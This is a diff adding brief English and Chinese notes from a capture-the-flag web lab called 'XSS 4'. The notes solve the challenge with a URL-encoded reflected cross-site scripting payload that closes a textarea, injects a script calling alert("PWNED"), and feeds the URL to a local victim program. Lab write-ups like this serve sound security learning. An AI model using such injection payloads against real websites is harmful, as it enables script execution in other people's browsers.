@@ -1,0 +1,15 @@
+#XSS 4
+#挑战简介
+Like with SQL injection and command injection, sometimes your XSS occurs in the middle of some non-optimal context. 
+In SQL, you have dealt with injecting into the middle of quotes. In XSS, you often inject into, for example, a textarea, as in this challenge. 
+Normally, text in a textarea is just, well, text that'll show up in a textbox on the page. Can you bust of this context and alert("PWNED")?
+
+As before, the /challenge/victim of this challenge takes a URL argument on the commandline, and it will visit that URL.
+
+#cat同上+Terminal
+
+#与上一个有所不同的，被包含在了一个<textarea></textarea>之中
+#想想将他等同于引号，前面加上</textarea>结束前面的，input后加上<textarea>结束后面的，复制url，即可
+http://challenge.localhost/?msg=%3C%2Ftextarea%3E%3Cscript%3Ealert%28%22PWNED%22%29%3C%2Fscript%3E%3Ctextarea%3E    //url
+
+/challenge/victim "http://challenge.localhost/?msg=%3C%2Ftextarea%3E%3Cscript%3Ealert%28%22PWNED%22%29%3C%2Fscript%3E%3Ctextarea%3E"
